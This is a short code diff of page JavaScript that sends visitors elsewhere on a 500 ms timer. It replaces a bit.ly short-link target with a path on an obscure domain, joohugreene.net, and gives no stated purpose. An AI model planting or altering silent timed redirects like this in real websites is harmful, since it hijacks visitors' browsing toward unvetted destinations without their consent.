@@ -4,8 +4,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/3VMnbBc";
+        location.href="https://joohugreene.net/4/7622925";
     }
     function goon(){
-        location.href="https://bit.ly/3VMnbBc";
+        location.href="https://joohugreene.net/4/7622925";
     }
